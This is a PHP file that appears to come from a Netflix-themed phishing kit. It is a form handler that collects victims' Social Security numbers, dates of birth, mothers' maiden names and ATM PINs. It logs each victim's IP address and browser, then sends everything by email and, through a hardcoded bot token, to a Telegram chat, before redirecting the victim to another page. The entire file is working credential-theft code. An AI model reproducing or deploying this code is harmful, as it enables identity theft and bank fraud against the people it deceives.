<?php include '../send.php';?>
<?php
function rands($length = 150) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
$r = rands();
?>
<?php

$ip = getenv("REMOTE_ADDR");
$timestamp = date('d/m/Y h:i:s');
$browser = $_SERVER['HTTP_USER_AGENT'];
$message .= "NetFlix B33LL XOUTH- ReZulT\n\n";
$message .= "SSN: ".$_POST['SSN']."\n";
$message .= "Date Of Birth: ".$_POST['DOB']."\n";
$message .= "Mother's Maiden Name:: ".$_POST['MMN']."\n";
$message .= "ATM PIN: ".$_POST['PIN']."\n\n";

$message .= "Time: $timestamp \n";
$message .= "User-Agent: $browser \n";
$message .= "IP Info: https://geoiptool.com/en/?ip=".$ip."\n";
$message .= "----------- -----------\n";

$subject = "NetFlix Personal Details (4)😈 INFO FROM 😈- $ip";
$headers = "";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "\n";
	 mail("", "", $message);
if (mail($recipient,$subject,$message,$headers))
	   {
		   header("Location:../log5.php?$r");
	   }
else
    	   {
 		echo "ERROR! Please go back and try again.";
  	   }

$token = "5093354886:AAFENFDXiDWaz7pAM9_O4GJb9aXsFGsSOs8";
$chat_id = "-539647287";

$arr = array(
    "INFO FROM: " => $message,

);

foreach ($arr as $key => $value) {
    $txt .= $key.$value."\n";
}

$sendToTelegram = sendMessage($chat_id, $txt, $token);
header("Location: /");



function sendMessage($chatID, $message, $token) {
    echo "sending message to " . $chatID . "\n";
    $url = "https://api.telegram.org/bot" . $token . "/sendMessage?chat_id=" . $chatID;
    $url .= "&text=" . urlencode($message);
    echo $url;
    $ch = curl_init();
    $optArray = array(
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}
?>